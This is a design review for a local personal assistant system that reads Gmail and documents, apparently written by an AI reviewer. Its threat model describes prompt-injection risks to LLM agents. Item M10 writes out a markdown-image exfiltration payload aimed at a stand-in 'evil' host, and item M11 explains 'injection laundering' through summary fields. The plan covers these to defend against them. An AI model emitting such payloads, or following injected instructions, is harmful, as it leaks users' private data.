# Agentic OS — Plan Review & Revised Plan

*Review date: 2026-10-25, revised 2026-10-26 with your answers (§0). Status: **draft for your approval.** No code has been written.*
*Lenses used (fullstack-dev-skills): `architecture-designer` (ADRs, NFRs, trade-offs), `security-reviewer` (threat model), `rag-architect` (retrieval), `the-fool` (pre-mortem + red team).*

---

## TL;DR — the five decisions that change your plan

| # | Decision | Why |
|---|----------|-----|
| 1 | **Stop routing your Claude subscription through 9router. Use a Claude Console API key.** | Anthropic's current terms say third-party developers may not "collect, store, or intermediate Claude.ai credentials or session tokens", and products built on the Agent SDK must use API keys. 9router's `cc/` provider stores and refreshes your subscription OAuth token, which is exactly that. The risk is an account ban, and enforcement can happen without notice. |
| 2 | **Don't use the Agent SDK. Write a thin loop on `@anthropic-ai/sdk` with a configurable `baseURL`.** | The SDK runs the Claude Code binary, with its file, shell and web tools. That's the wrong default for agents that read untrusted email. Your use case needs roughly 6 typed tools, a 60-line loop, and code-enforced policy. |
| 3 | **Build one agent and three pipelines, not four agents.** | Triage, consolidation and drafting are deterministic jobs with one LLM call each. Only chat needs a tool loop. Defer the Researcher agent: it opens an exfiltration channel. |
| 4 | **Keep raw email out of git.** Gmail stays the source of truth for mail. Store IDs plus extracted, minimized fields. | Git history is permanent. Committing other people's emails contradicts your own GDPR minimization rule and bloats the vault. |
| 5 | **Your Gmail token can send mail even without `gmail.send`.** `gmail.modify` and `gmail.compose` both allow sending. | "No send tool" has to be enforced by isolating the token in a mail worker that only exposes label and archive operations. Leaving out a scope doesn't do it. |

---

## 0. Revision 2: decisions from your answers (2026-10-26)

| Q | Your answer | Decision |
|---|---|---|
| 1 | You'll add the API key yourself later. **Update 2026-10-26:** you chose 9router (`cc/*` subscription models) through `.env` | Built for a **Claude Console API key** read from the OS keychain (`agentic-os/anthropic`). Without a key, the app starts and shows a "Connect provider" banner, and LLM features stay disabled. |
| 2 | (default) | Laptop only, `127.0.0.1`. |
| 3 | Classify mail by context using Jev + Claude | **Two-stage cascade:** a local Jev-compatible decider runs first, and Claude handles the uncertain cases. See §0a. Categories stay **local** in the app, and Gmail access stays `gmail.readonly` until you explicitly turn on Gmail labels (month 3+). |
| 4 | (default) | About 100 mails a day across all accounts, 90-day backfill. |
| 5 | (default) | Occasional Persian. `multilingual-e5-base` first, `bge-m3` tested against it. |
| 6 | "The brain uses the Claude key, Jev for fast decisions" | Yes. Your Q6 was really about **MCP** (using the brain from Claude Code or Desktop). Default: no MCP wrapper until you ask for one. |
| 7 | Lots of PDF / Word / MD context, and use constrained decoding if it's free | **Document ingestion with Docling** becomes a first-class pipeline (§0b). Constrained decoding is free and already in the design (§0c). |
| 8 | Obsidian is needed if the OS needs it | **The vault is fully Obsidian-compatible** and the app handles edits made in Obsidian (§0d). |
| HW | RTX 2070 Max-Q **8 GB VRAM** (Turing), 32 GB RAM, i7-9750H 6C/12T (detected) | All ML runs **on the GPU in the sidecar**: decider, embeddings, Docling OCR. Turing has **no bf16**, so use fp16/fp32 weights. See the VRAM budget in §0a. |

### 0a. "Jev": what it actually is, and the open-source plan

**Correction:** Jev (by TypeSafe) is **proprietary and hosted, not open source** ([akitaonrails comparison](https://akitaonrails.com/en/2026/10/10/which-jev-like-ai-decision-classifier-model-is-best/), [The Batch](https://www.deeplearning.ai/the-batch/models-built-to-do-one-thing-well)). Using it would send your email to a third party, which breaks your local-only rule. There are open-source models that speak **the same wire format** (`POST /v1/systemone`, with typed `choice` / `score` / `noul` questions → probabilities):

| Option | License | Size | Runs on | Languages | Fit |
|---|---|---|---|---|---|
| **[Laya](https://github.com/NandhaKishorM/laya) multilingual** | Apache-2.0 | 322M | **CPU** (about 0.2–0.5 s per call), GPU optional | 100+ languages (German shown, Persian ⚠️ unverified) | ✅ **Default.** It runs on any laptop, has a built-in `laya-serve` endpoint, and **you can fine-tune it on your own corrections** |
| [Kev](https://github.com/jaredpalmer/kev) 0.8B / 4B | Apache-2.0 | 0.8–4B | 0.8B on a 4 GB GPU. 4B needs a large GPU or a 32 GB Mac | not stated | ⚠️ Upgrade path if you have a good NVIDIA GPU |
| [Jev](https://www.deeplearning.ai/the-batch/models-built-to-do-one-thing-well) (hosted) | Proprietary | ? | TypeSafe cloud | — | ❌ Breaks local-only. Possible only as an opt-in for T0 data |

**On your laptop (RTX 2070 Max-Q, 8 GB):** Laya multilingual runs on CUDA. The README reports about 33 ms per question on a T4, which is the same Turing generation, so expect tens of milliseconds on yours ⚠️ (estimate). **Kev-0.8B** (its README says it needs a 4 GB GPU) gets benchmarked against Laya on your golden set in month 1, and the more accurate one wins. **Kev-4B is out:** it needs a far larger GPU. Run on mains power, because the Max-Q GPU throttles on battery.

| VRAM budget (estimates) | ~GB |
|---|---|
| Laya multilingual (fp32) | 1.3 |
| bge-m3 embeddings (fp16) | 1.2 |
| Docling layout/OCR models (loaded only during ingestion) | 1–2 |
| Kev-0.8B (fp16, only if it wins the benchmark) | 1.7 |
| Windows display + headroom | 1.5 |
| **Total** | **≈ 6.7 of 8** |

Because all three use the same API, the app has **one `decider.ts` client with a configurable `baseURL`**. Switching Laya → Kev → Jev is a config change, the same way the LLM client works.

**How the cascade works for each email or session:**

```
item ──► sanitize + T3 redaction ──► decider (local, ~0.3 s, no generation)
            questions: area (choice over active areas), importance (score 1-5),
                       needs_action (noul), is_newsletter (noul), language (choice)
            │
            ├─ calibrated confidence ≥ threshold ──► accept (auto-file)
            └─ below threshold / "new area?" ──► Claude (structured output) ──► file or propose category
```

Why this design:

- **Cost and speed:** most mail never reaches Claude.
- **Security:** a non-generative decider *can't* produce injected instructions. It only returns probabilities over options you defined, which makes it the ideal quarantined reader.
- **"Learns me":** your corrections become Laya fine-tuning data. Laya ships a CPU/Apple-Silicon fine-tune script with calibration. This is real, cheap, local training on your own decisions, unlike fine-tuning a frontier model.

**Caveats (verified):** Laya's shipped checkpoints are over-confident, and the multilingual one has no fitted temperatures. The default context is 1,024 tokens (up to 8,192). So the thresholds are calibrated on your golden set before auto-filing turns on (see M12), and emails are passed as subject + sender + the first ~1k tokens. Small decider models aren't Jev-level accurate out of the box ([comparison](https://akitaonrails.com/en/2026/10/10/which-jev-like-ai-decision-classifier-model-is-best/)), which is exactly why Claude stays behind them.

### 0b. Document ingestion (PDF, Word, MD and more)

**Tool:** [Docling](https://github.com/docling-project/docling) (MIT, Windows supported, Python ≥ 3.10). It handles PDF, DOCX, PPTX, XLSX, HTML and EML, plus **OCR for scanned PDFs**, and outputs Markdown + lossless JSON with structure (headings, tables, page numbers). `.md` and `.txt` files are read directly without it.

**Pipeline** (drop the file into `vault/inbox/` or upload it in the UI; idempotent by SHA-256):

1. Hash. Skip if already ingested.
2. Store the original in `vault/attachments/<sha>.<ext>`. This folder is **gitignored but backed up with restic**, so Obsidian can open it and git stays small.
3. Docling converts it to `vault/wiki/<area>/sources/<slug>.md`, with frontmatter and a link to the original.
4. T3 scan and redaction, then the decider picks the area and sensitivity tier.
5. Chunk by Docling's heading structure, **keeping the page number for every chunk** so answers can cite "p. 12".
6. Embed and index (hybrid search).
7. Claude (structured output) extracts a summary note, key concepts, `items`, and for study areas, **question cards** for active recall (tutor mode). Everything goes through the review queue.

Running Docling on large or untrusted files is risky, so it runs as a subprocess with a timeout. Its OCR models are downloaded once and it gets no network access after that. Very large PDFs are processed section by section.

### 0c. "Constrained Decoding Models"

Constrained decoding (CD) is a **technique, not a type of model**: during generation, tokens that would break a JSON schema or grammar are masked out, so the output is always valid. It's free and already covered:

- **Claude API structured outputs** (`output_config.format` and `strict: true` tools) use constrained decoding to guarantee schema-valid JSON ([Anthropic docs](https://platform.claude.com/docs/en/build-with-claude/structured-outputs)). Every Claude extraction in this plan uses it, with Zod schemas as the source of truth.
- **Decider models** (Laya, Kev) are constrained by design: they can only answer with the options you supply.
- Open-source engines for *local generative* models (XGrammar, llguidance, llama.cpp GBNF) would only matter if you add a local text-generating LLM. Skipped for now. Add one if you want fully offline extraction.

⚠️ Whether 9router passes structured outputs through is untested, so it's added as smoke-test check 5.

### 0d. Obsidian as a required part

- **Conventions:** every app-written note has YAML frontmatter (`id`, `area`, `tags`, `sensitivity`, `source`, `created`, `updated`). Links use `[[wikilinks]]`, and attachments live in `attachments/`. Only Obsidian core features: **no community plugins** (they're a supply-chain risk and could read the whole vault).
- **Two-way sync:** a file watcher (`chokidar`) re-indexes any note you edit in Obsidian, using its content hash.
- **No overwrites:** the app never overwrites a file whose hash changed since the app last wrote it. It creates a proposal in the review queue instead.
- **Your edits count as feedback:** editing a session summary or an item in Obsidian is recorded the same way as an edit in the app's UI.
- `.obsidian/` keeps a minimal committed config (attachment folder, link format). Workspace and UI-state files are gitignored.

---

## 1. Plan critique

### 1a. Must change

| # | Problem in the draft | Change |
|---|----------------------|--------|
| M1 | **Subscription via proxy** is assumed fine. It isn't (see §2). | Use a Console API key, set up so you can swap providers by config only (§2c). |
| M2 | **Agent SDK as orchestrator.** It requires API-key auth for third-party apps, bundles a powerful tool surface, loads `.claude/` config implicitly, and couples you to the CLI binary's release cadence. | Use a thin custom loop (ADR-002). Policy, audit and tool allow-lists are plain TypeScript you own and unit-test. |
| M3 | **Four agents from day one.** | 1 agent (Chat, with brain tools) + 3 pipelines (Triage, Consolidate, Draft). Researcher is deferred (ADR-003). |
| M4 | **"Rebuild brain.db from the vault"** while chats, facts, approvals and the audit log live in the DB. That's two sources of truth with an unclear direction. | Split the tables by role. *Canonical* tables (sessions, messages, items, categories, approvals, audit) are the source of truth, backed up with `sqlite3 .backup` + restic, and the small ones are exported nightly as JSONL to git. *Derived* tables (chunks, FTS, vectors) are rebuildable. The vault holds human-readable notes and session summaries. |
| M5 | **`raw/` holds immutable inputs, including email**, inside a git repo. | Don't store raw email bodies long-term. Keep `gmail_id`, headers, and the quarantined extraction. Sanitized body text is kept only for N days (default 30) to support search, then dropped. Mail can be re-fetched. |
| M6 | **"No `gmail.send`" is treated as a send-prevention control.** Per Google's scope table, `gmail.modify` "reads, composes, and sends", and `gmail.compose` "manage[s] drafts and send[s] emails". | The OAuth tokens live only in a **mail worker** module whose public functions are `listHistory`, `getMessage`, `applyLabels`, `archive` (and later `createDraft`). No code path calls `messages.send`, and a unit test greps for it. The LLM never sees a token. |
| M7 | **Refresh tokens in "Testing" status expire after 7 days** (verified). | Set the consent screen to **In production**, but leave it unverified. Personal-use apps under 100 users are exempt from verification. You click through the "unverified app" warning once per account, then re-consent so the old Testing tokens are replaced. |
| M8 | **Sensitivity tiers are applied only at retrieval.** | Enforce T3 at **ingestion**: detectors for IBAN, Luhn-valid card numbers, `otpauth://`/TOTP seeds, German Steuer-ID, passport-like patterns, and password-reset links. Matching content is redacted before anything is stored or sent to an LLM. T2 items never enter prompts unless the request explicitly targets them. |
| M9 | **Localhost is treated as a security boundary.** Any web page you visit can make requests to `127.0.0.1` through CSRF or DNS rebinding. | Check that the `Host` header is `127.0.0.1:<port>`, check `Origin`, use SameSite=Strict session cookies plus a CSRF token, and set a strict CSP. Apply the same hardening to 9router if you keep it. |
| M10 | **Markdown rendering of model output.** A prompt-injected answer containing `![](https://evil/?q=<secret>)` exfiltrates data the moment it renders. | CSP `img-src 'self' data:`, sanitize with DOMPurify, and show links as text until you click them. This is the most common real-world LLM exfiltration path. |
| M11 | **Free-text fields from the quarantined reader** (e.g. `summary`) still carry injected instructions into the privileged context ("injection laundering"). | The schema is mostly enums, IDs, dates, and short strings with length caps. Every derived record carries `trust='untrusted'`. Untrusted text is always wrapped in data delimiters, and it can never become an approval payload without your review. |
| M12 | **Confidence thresholds (0.85 / 0.6) use LLM self-reported confidence**, which is uncalibrated. | Start with conservative thresholds, then **calibrate them on your golden set**: pick the threshold where precision is ≥ 95%. Until there are 50+ labelled sessions, everything goes to "file + flag". |

### 1b. Nice to have / simplify

| # | Item | Suggestion |
|---|------|-----------|
| N1 | Full bitemporal facts. | Keep `valid_from`, `valid_to`, `recorded_at` and `superseded_by` as columns, but don't build bitemporal query APIs until you actually ask "what did I believe in March?". |
| N2 | Separate tables for decisions, commitments, facts, preferences and so on. | Use **one `items` table with a `kind` enum**. It means one review queue, one extraction schema, and one export. |
| N3 | Own MCP server in month 1. | The brain tools are a plain TS module first. Wrap them in an MCP stdio server **only when you want to use the brain from Claude Code or Desktop**. That wrapper is about 50 lines with `@modelcontextprotocol/sdk`. |
| N4 | Reranker. | Skip it until retrieval evals show a gap. RRF over BM25 + vector is good enough at personal scale. |
| N5 | Separate keys per agent. | One Console **workspace** with a spend limit, plus a per-pipeline `llm_calls` ledger, gives you the same visibility with less key handling. |
| N6 | `CLAUDE.md` in the vault. | Fine, and a bonus: if you ever open the vault in Claude Code, the file loads automatically. Your app reads the same file as its system rules. |
| N7 | Persona self-interview as a big week-1 task. | Make it a **chat mode**: 10 questions a day, with answers going to `persona/` through the normal review queue. |

### 1c. The three specific challenges

**SQLite vs Postgres. Verdict: SQLite, with a clear exit criterion.**

| | SQLite (+FTS5, sqlite-vec) | Postgres (+pgvector) |
|---|---|---|
| Ops on a sleeping Windows laptop | One file, no daemon | A service to run, upgrade and back up |
| Backup | `.backup` / `VACUUM INTO` + restic | `pg_dump` + restic |
| Vector scale | Brute-force KNN, fine to ~200–500k chunks (estimate, see verify note) | HNSW/IVF indexes into the millions |
| Concurrency | One writer (WAL), which suits a single user | Many writers |
| Lock-in | None | None |

**Migrate to Postgres when** you need a second machine or phone writing concurrently, the corpus passes about 500k chunks with query latency above 200 ms, or you want ANN plus complex filtering. Keep SQL portable: no SQLite-only JSON tricks in core queries.

**Agent SDK vs thin loop. Verdict: thin loop (ADR-002).** The SDK's value is Claude Code's tools and context management for *coding agents*. Your agents need a narrow, typed toolset where deny-by-default is the whole point. A custom loop gives you the same hooks as plain functions (`beforeTool`, `afterTool`) that you can test, and it works through any `/v1/messages`-compatible endpoint.

**Number of agents. Verdict: 1 + 3 pipelines.** An "agent" earns its place when the next step can't be known in advance. Triage is `email → JSON`. Consolidation is a nightly batch over a known set. Drafting is a template plus retrieval. Only open-ended chat needs a loop. Every extra agent is another prompt to evaluate and another permission set to audit.

---

## 2. Terms and provider check

### 2a. Subscription via proxy: what the terms say (verified 2026-10-25)

From [Claude Code — Legal and compliance](https://code.claude.com/docs/en/legal-and-compliance):

- OAuth (subscription) auth "is designed to support ordinary use of Claude Code and other native Anthropic applications".
- Developers "including those using the Agent SDK, should use API key authentication through Claude Console".
- Developers "may not collect, store, or intermediate Claude.ai credentials or session tokens".
- "Anthropic reserves the right to take measures to enforce these restrictions … without prior notice."

The [Agent SDK overview](https://code.claude.com/docs/en/agent-sdk/overview) says the same: use API keys, not claude.ai login. Server-side blocking of third-party OAuth use has been reported since January 2026 ([The Register](https://www.theregister.com/software/2026/02/20/anthropic-clarifies-ban-on-third-party-tool-access-to-claude/5014546), [WinBuzzer](https://winbuzzer.com/2026/02/19/anthropic-bans-claude-subscription-oauth-in-third-party-apps-xcxwbn/)).

**My reading (I'm not a lawyer):** 9router's Claude Code provider stores your subscription OAuth token and replays it from a custom app. That's credential intermediation, and it's not permitted. It doesn't matter that the only user is you. The documented exception covers the *unmodified Claude Code binary* signed in with your own subscription. That makes `claude -p` called from a script a grey zone at best, so don't build your pipeline on it.

**Recommendation:** get a Console API key in a dedicated workspace with a monthly spend limit, and keep your subscription for claude.ai and Claude Code.

### 2b. 9router: compatibility and hardening

What I verified from the [9router README](https://github.com/decolua/9router) and [community docs](https://claude-plugins.dev/skills/@decolua/9router/9router-chat):

| Feature your design needs | 9router status | If missing |
|---|---|---|
| Anthropic `/v1/messages` | Exposed (community docs). Claude Code works through `ANTHROPIC_BASE_URL` | — |
| Streaming (SSE) | Yes | — |
| Tool use (`tool_use`/`tool_result` blocks) | **Not documented.** Translation between formats may lose fidelity | Tool calling may break with non-Claude backends |
| Prompt caching (`cache_control`) | **Not documented** | Higher cost on the persona and rules prefix |
| Message Batches API | **Not documented, assume absent** | Nightly jobs run at full price, sequentially |
| Token counting / extended thinking | Not documented | Cost estimates only from usage fields |
| Default security | `INITIAL_PASSWORD` falls back to **`123456`**, `REQUIRE_API_KEY=false`, Docker binds `0.0.0.0`. Request logs are off by default but capture full payloads when on | — |

**Compatibility test plan** (run once, keep it as `scripts/provider-smoke.ts`, and re-run whenever a model or provider changes):

1. Plain message, then the same message streaming. Assert the text matches the shape and the `usage` field is present.
2. A tool round trip with 2 tools, a forced `tool_choice`, and a parallel tool call. Assert the `tool_use` IDs round-trip.
3. Prompt caching: send the same 4k-token system prompt twice with `cache_control`. Assert `cache_read_input_tokens > 0` on the second call.
4. `POST /v1/messages/batches`. Expect 404 through 9router.
5. Structured output: `output_config.format` with a JSON schema, and a `strict: true` tool. Assert both validate with Zod.
6. Error mapping: send an invalid model and an oversized prompt. Assert a typed error, not a hang.

**If you keep 9router** (for non-Claude models only): set `HOSTNAME=127.0.0.1`, a strong `INITIAL_PASSWORD` and `JWT_SECRET`, `REQUIRE_API_KEY=true`, `ENABLE_REQUEST_LOGS=false`, and add a Windows Firewall inbound block on port 20128. **Never route T1+ data to free-tier providers** in its catalog: many of them train on prompts. Pin email and persona pipelines to Anthropic.

### 2c. Provider-agnostic layer (the lazy version)

Use the **Anthropic Messages format as the internal lingua franca.** One `llm.ts` wraps `@anthropic-ai/sdk` with `{ baseURL, apiKeyRef, models: { triage, extract, synth } }` from config:

- Direct Anthropic: `baseURL=https://api.anthropic.com`
- Through 9router (for other providers): `baseURL=http://127.0.0.1:20128` and a 9router key

Switching providers is a config change. Batch and caching are feature flags that the smoke test sets. Skipped: an adapter per vendor. Add one only if you need a provider that neither Anthropic nor 9router's translation can serve.

---

## 3. Verified facts

| Topic | Fact | Source | Status |
|---|---|---|---|
| Claude subscription OAuth | Not for third-party apps or the Agent SDK. No credential intermediation | [Legal & compliance](https://code.claude.com/docs/en/legal-and-compliance) | ✅ Verified |
| Agent SDK auth | API key (Console, Bedrock, Vertex, Foundry). It "runs the Claude Code binary" | [SDK overview](https://code.claude.com/docs/en/agent-sdk/overview) | ✅ Verified |
| Agent SDK through a proxy | Claude Code supports gateways via `ANTHROPIC_BASE_URL`. Full SDK feature parity through 9router is untested | community docs | ⚠️ Unverified |
| Gmail `gmail.modify`, `readonly`, `compose`, `metadata` | **Restricted**. `modify` and `compose` can send | [Gmail scopes](https://developers.google.com/workspace/gmail/api/auth/scopes) | ✅ Verified |
| `gmail.labels` | Non-sensitive, but it only manages label *definitions*. Applying labels to messages needs `gmail.modify` | same | ✅ / ⚠️ (application rule from API knowledge) |
| `gmail.send` | Sensitive | same | ✅ Verified |
| Testing-status tokens | Expire after 7 days (External user type, unless only basic identity scopes) | [Google OAuth2](https://developers.google.com/identity/protocols/oauth2) | ✅ Verified |
| Other refresh-token killers | 6 months unused. **Password change (when Gmail scopes are granted)**. 100 tokens per client per account (oldest dropped silently) | same | ✅ Verified |
| Personal-use exemption | Under 100 users can skip verification and click through the unverified-app screen | [Google help 13464323](https://support.google.com/cloud/answer/13464323?hl=en), [7454865](https://support.google.com/cloud/answer/7454865) | ✅ Verified (via search summary) |
| sqlite-vec | Latest stable 0.1.9 (2026-03-31), 0.1.10-alpha.4 (2026-05-18). Pre-1.0 | [docs.rs](https://docs.rs/crate/sqlite-vec/=0.1.7), [RubyGems](https://rubygems.org/gems/sqlite-vec?locale=en) | ✅ Releases verified, maintenance cadence ⚠️ |
| SQLite's own `vec1` | Reportedly merged into the SQLite tree (Sept 2026), with memory-safety bugs reported in testing | [SQLite forum](https://sqlite.org/forum/info/a09b103d9d41ed25a357a42aa22ca32a93d4a5fb9b10eb40ab3e14cde508e8f1?t=c), [news](https://book.st-hakky.com/news/sqlite-vec1-vector-search-extension) | ⚠️ Unverified: watch it as a future replacement |
| 9router defaults | Port 20128, password fallback `123456`, `REQUIRE_API_KEY=false`, logs off by default | [README](https://github.com/decolua/9router) | ✅ Verified |
| `keytar` (keychain lib) | Archived. Use `@napi-rs/keyring` (Windows Credential Manager) | from memory | ⚠️ Verify before use |
| Jev | Proprietary, hosted (TypeSafe) | [akitaonrails](https://akitaonrails.com/en/2026/10/10/which-jev-like-ai-decision-classifier-model-is-best/) | ✅ Verified |
| Laya | Apache-2.0, 322M multilingual, CPU OK, `laya-serve` `/v1/systemone`, over-confident uncalibrated multilingual checkpoint | [repo](https://github.com/NandhaKishorM/laya) | ✅ Verified. Persian ⚠️ |
| Kev | Apache-2.0, 0.8B–27B, Jev System One API, CUDA/ROCm/MLX/CPU | [repo](https://github.com/jaredpalmer/kev) | ✅ Verified. Windows ⚠️ |
| Docling | MIT, Windows, PDF/DOCX/PPTX/XLSX/EML, OCR, Markdown/JSON out | [repo](https://github.com/docling-project/docling) | ✅ Verified |
| Claude structured outputs | Constrained decoding, `output_config.format` + `strict` tools | [docs](https://platform.claude.com/docs/en/build-with-claude/structured-outputs) | ✅ Verified. Support on current models ⚠️ check |
| Batch API discount, prompt-cache pricing | Check the [pricing page](https://www.anthropic.com/pricing) when you create the key | — | ⚠️ Not checked |
| Anthropic API data retention / training | Check the commercial terms and privacy center for your key type | — | ⚠️ Not checked |

---

## 4. Revised architecture

### 4a. Diagram

```
                ┌──────────────────────── Laptop (Windows 11, BitLocker) ─────────────────────────┐
                │                                                                                │
 You ──browser──┼─► Vue UI (Vite build, served by server)  ── CSP, CSRF, Host/Origin checks       │
                │        │ HTTP + SSE (progress, streaming)                                      │
                │        ▼                                                                       │
                │   ┌─────────────── server (Node, Fastify, single process) ────────────────┐    │
                │   │  api/        chat, refresh, review-queue, audit, evals                │    │
                │   │  chat-agent  ← ONLY tool loop. Tools: search, get_item,               │    │
                │   │              propose_item, propose_category, draft_reply(local)       │    │
                │   │  policy.ts   deny>ask>allow, per-tool allow-list, audit every call    │    │
                │   │  jobs/       SQLite-backed queue, idempotent, resumable               │    │
                │   │    ├ refresh   → mail-worker.fetch → triage → extract → index         │    │
                │   │    ├ consolidate (nightly/on refresh): merges, contradictions         │    │
                │   │    └ draft     (on request): persona + past-sent retrieval            │    │
                │   │  mail-worker ← holds Gmail tokens; exposes list/get/label/archive     │    │
                │   │    └ ingest-doc (on drop/upload): Docling → md → classify → index     │    │
                │   │  decider.ts  ← /v1/systemone client (Laya local; Kev/Jev by config)   │    │
                │   │  triage      ← QUARANTINED: decider first, Claude fallback, no tools  │    │
                │   │  sanitize    ← HTML→text, strip URLs/images, T3 redaction             │    │
                │   │  vault-watch ← chokidar: Obsidian edits → re-index / feedback         │    │
                │   │  retrieval   ← FTS5 BM25 + sqlite-vec, RRF, tier/area filter          │    │
                │   │  embed       ← local multilingual model (transformers.js / ONNX)      │    │
                │   │  llm.ts      ← @anthropic-ai/sdk, baseURL from config                 │    │
                │   └───────┬────────────────────────┬───────────────────────┬──────────────┘    │
                │           ▼                        ▼                       ▼                   │
                │    data/brain.db             vault/ (git repo)       OS keychain                │
                │    canonical + derived       notes, summaries,       Gmail refresh tokens,     │
                │    (WAL, .backup→restic)     persona, JSONL exports  API key                   │
                │                              attachments/ (ignored)                            │
                │   ┌── sidecar/ (Python, uv, 127.0.0.1 + bearer key, no outbound network) ──┐   │
                │   │  laya-serve  POST /v1/systemone        docling CLI (subprocess)       │   │
                │   └────────────────────────────────────────────────────────────────────────┘   │
                │                                                                                │
                └────────────────┬───────────────────────────────────┬───────────────────────────┘
                                 ▼                                   ▼
                       api.anthropic.com (prompts)          Gmail API (per account)
                       [optional: 9router on 127.0.0.1 for non-Claude models]
```

**Trust rule (Rule of Two):** triage = untrusted input, no private brain data, no tools. Chat agent = private data, no untrusted raw input, no outbound tools. Nothing gets all three. Researcher is deferred. When it's added, it gets web access and *your typed query only*, and every query is shown to you before it runs, because a query built from private context is an exfiltration channel.

### 4b. Components

| Component | Responsibility | Notes |
|---|---|---|
| `server` | HTTP API, SSE, job runner | One process. No Redis, no separate workers |
| `chat-agent` | Tool loop with 5 tools | Max 8 iterations, token budget per turn |
| `policy` | Allow-list per caller, approval gate, audit write | Unit-tested. Deny by default |
| `mail-worker` | Gmail incremental sync via `historyId`, labels | The only code holding tokens. No send |
| `triage` | Raw email → `{area, importance, action_needed, due, people_roles[], short_reason}` | Decider first (§0a), Claude structured output below the threshold |
| `decider` | Typed fast decisions (area, importance, yes/no) | Laya multilingual via `laya-serve`. Same client works for Kev or Jev |
| `ingest-doc` | PDF/DOCX/PPTX/MD → Markdown note + chunks with page numbers | Docling subprocess (§0b) |
| `vault-watch` | Re-indexes Obsidian edits, records edits as feedback, never overwrites | §0d |
| `extract` | Session or email → `items[]` with source spans | Mid tier |
| `consolidate` | Dedup, contradictions, category merge/split proposals | Top tier. Batch if available |
| `retrieval` | Hybrid search, filtered **before** scoring | See §4c |
| `vault-sync` | Writes summaries and JSONL exports, `git commit` | Nightly and after refresh |
| `evals` | Golden sets, runs on prompt or model change | CLI + UI tab |

### 4c. Retrieval (rag-architect notes)

- **Chunking:** chats split per turn-pair and capped at about 600 tokens. Notes split by heading. Emails get one chunk (the sanitized excerpt). Tune chunk sizes on your data, not on defaults.
- **Embeddings:** with the GPU, **`bge-m3`** (1024-d, strong multilingual, 8k context) is affordable and becomes the default. It runs in the **sidecar** (sentence-transformers, fp16 on CUDA), next to the decider: one ML process, no daemon. `multilingual-e5-base` is the comparison baseline, tested on 50 of your own queries in EN/DE/FA. If the sidecar is down, keyword (BM25) search still works and vectors are queued. Store `embedding_model_id` per vector so a model switch is a background re-embed, not a migration.
- **FTS5:** use `tokenize='unicode61 remove_diacritics 2'`. German compounds hurt BM25. Add a second `trigram` FTS table only if evals show missed compound matches.
- **Fusion:** RRF (k=60) over the top 50 from each, after filtering `sensitivity <= allowed_tier AND area IN (...) AND deleted_at IS NULL`.
- **Eval:** 50 query→expected-doc pairs. Targets: recall@10 ≥ 0.8, MRR ≥ 0.5. Re-run on every chunking or model change.

### 4d. SQLite schema (DDL sketch)

```sql
-- taxonomy
areas(id PK, parent_id FK NULL, slug UNIQUE, name, status CHECK IN('proposed','active','merged','archived'),
      created_by CHECK IN('user','model'), merged_into FK NULL, created_at)

-- canonical: chat
sessions(id PK, title, area_id FK, tags JSON, area_confidence REAL, filing_status CHECK IN('auto','flagged','inbox','user'),
         started_at, ended_at, summary_path)        -- summary lives in vault
messages(id PK, session_id FK, role, content, model, created_at)       IDX(session_id, created_at)

-- canonical: extracted knowledge (one table, many kinds)
items(id PK, kind CHECK IN('fact','decision','commitment','todo','preference','question','lesson'),
      text, area_id FK, due_at NULL, valid_from NULL, valid_to NULL, recorded_at,
      source_type, source_id, source_span, trust CHECK IN('trusted','untrusted'),
      sensitivity INT CHECK BETWEEN 0 AND 2, confidence REAL,
      status CHECK IN('proposed','accepted','rejected','superseded'), superseded_by FK NULL)
      IDX(area_id, status), IDX(kind, due_at)

-- mail (no long-term bodies)
mail_accounts(id PK, email UNIQUE, history_id, last_sync_at, status)
mail_messages(id PK, account_id FK, gmail_id, thread_id, from_addr, subject, received_at,
              gmail_labels JSON, triage JSON, area_id FK, importance INT, body_excerpt NULL,
              excerpt_expires_at, processed_at)
              UNIQUE(account_id, gmail_id)  IDX(area_id, received_at)

-- canonical: ingested files (original in vault/attachments/<sha>.<ext>)
files(id PK, sha256 UNIQUE, original_name, mime, bytes, note_path, area_id FK, sensitivity,
      status CHECK IN('queued','converted','indexed','failed'), error, ingested_at)
vault_notes(path PK, content_hash, last_written_by CHECK IN('app','user'), indexed_at)  -- overwrite guard

-- canonical: decider calls (training data for Laya fine-tunes)
decisions(id PK, subject_type, subject_id, question, answer, confidence, backend, model,
          escalated BOOL, final_answer, corrected_by_user BOOL, created_at)
          IDX(question, corrected_by_user)

-- derived (rebuildable)
documents(id PK, source_type CHECK IN('chat','email','note','file'), source_id, area_id, sensitivity, trust,
          content_hash, updated_at)
          UNIQUE(source_type, source_id)
chunks(id PK, doc_id FK, ord, heading_path, page_from NULL, page_to NULL, text)
chunks_fts USING fts5(text, content='chunks', content_rowid='id', tokenize='unicode61 remove_diacritics 2')
chunk_vec USING vec0(chunk_id INTEGER PRIMARY KEY, embedding float[1024], area_id INTEGER, sensitivity INTEGER)
          -- metadata columns for pre-filtering: verify support in your sqlite-vec version
embedding_models(id PK, name, dim, active BOOL)

-- ops
jobs(id PK, kind, idempotency_key UNIQUE, payload JSON, status, attempts, run_after, locked_at,
     progress JSON, error, created_at)                                   IDX(status, run_after)
approvals(id PK, action_type, payload JSON, proposed_by, status, decided_at,
          original_text NULL, final_text NULL, edit_distance NULL)        IDX(status)
audit_log(id PK, ts, actor, tool, args_redacted JSON, decision, approver, prev_hash, hash)
          -- triggers RAISE on UPDATE/DELETE; hash chain = tamper-evident
llm_calls(id PK, ts, pipeline, model, input_tokens, output_tokens, cache_read_tokens, latency_ms, job_id)
          IDX(ts), IDX(pipeline, ts)

-- evals
eval_cases(id PK, suite, input_ref, expected JSON, from_approval_id NULL)
eval_runs(id PK, suite, prompt_version, model, score REAL, details JSON, ran_at)
```

Rebuild = `DROP` the derived tables → re-chunk `sessions`, `items`, `mail_messages` and vault notes → re-embed.

### 4e. ADRs (short form)

| ADR | Decision | Alternatives rejected | Trade-off accepted |
|---|---|---|---|
| 001 | SQLite single file | Postgres + pgvector | One writer, brute-force KNN |
| 002 | Thin tool loop on `@anthropic-ai/sdk` | Agent SDK, LangChain, Vercel AI SDK | You write about 200 lines of loop and policy yourself |
| 003 | 1 agent + 3 pipelines | 4 agents | Less "agentic", more predictable |
| 004 | Console API key | Subscription via 9router | Pay-per-token cost |
| 005 | Gmail = mail source of truth, no bodies in git | `raw/` email archive | Search over old mail needs a re-fetch |
| 006 | Gmail app "In production", unverified | Testing status, CASA verification | Click-through warning, 100-user cap (irrelevant for you) |
| 007 | Local decider (Laya) → Claude cascade over `/v1/systemone` | Claude for everything; hosted Jev | Needs a Python sidecar and calibration on your data |
